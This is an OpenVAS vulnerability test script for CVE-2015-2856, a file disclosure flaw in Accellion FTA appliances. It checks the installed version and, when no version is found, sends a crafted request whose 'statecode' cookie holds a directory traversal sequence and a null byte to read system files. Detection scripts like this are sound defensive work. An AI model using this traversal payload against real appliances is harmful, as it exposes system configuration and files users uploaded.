###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_accellion_fta_file_discl_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Accellion FTA File Disclosure Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/h:accellion:secure_file_transfer_appliance';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106031");
  script_version("$Revision: 13659 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2015-07-28 09:48:42 +0700 (Tue, 28 Jul 2015)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_cve_id("CVE-2015-2856");

  script_name("Accellion FTA File Disclosure Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_accellion_fta_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("accellion_fta/installed");

  script_tag(name:"summary", value:"Accellion FTA is prone to a file disclosure vulnerability");

  script_tag(name:"vuldetect", value:"Send a crafted GET request and check if we can read system files.");

  script_tag(name:"insight", value:"The vulnerability is triggered when a user-provided 'statecode'
  cookie parameter is appended to a file path that is processed as a HTML template. By prepending this
  cookie with directory traversal sequence and appending a NULL byte, any file readable by the web user
  can be exposed.");

  script_tag(name:"impact", value:"An attacker can read sensitive files, including the system
  configuration and files uploaded to the appliance by users.");

  script_tag(name:"affected", value:"Accellion FTA Version 9.11.200 and prior.");

  script_tag(name:"solution", value:"Upgrade to version 9.11.210 or later.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("version_func.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!infos = get_app_version_and_location(cpe: CPE, port: port, exit_no_version: FALSE))
  exit(0);

version = infos['version'];

if (version) {
  if (version_is_less(version: version, test_version: "9.11.210")) {
    report = report_fixed_ver(installed_version: version, fixed_version: "9.11.210");
    security_message(port: port, data: report);
    exit(0);
  }
}
else {

  if( !dir = infos['location'] )
    exit(0);

  if (dir == "/")
    dir = "";

  files = traversal_files();

  foreach pattern(keys(files)) {

    file = files[pattern];

    host = http_host_name(port: port);
    url = dir + '/intermediate_login.html';
    cookie = 'statecode=../../../../../' + file + '%00';
    useragent = http_get_user_agent();

    req = 'GET ' + url + ' HTTP/1.1\r\n' +
          'Host: ' + host + '\r\n' +
          'User-Agent: ' + useragent + '\r\n' +
          'Cookie: ' + cookie + '\r\n\r\n';

    buf = http_keepalive_send_recv(port: port, data: req);
    if (egrep(string:buf, pattern:pattern)) {
      report = report_vuln_url(port: port, url: url);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);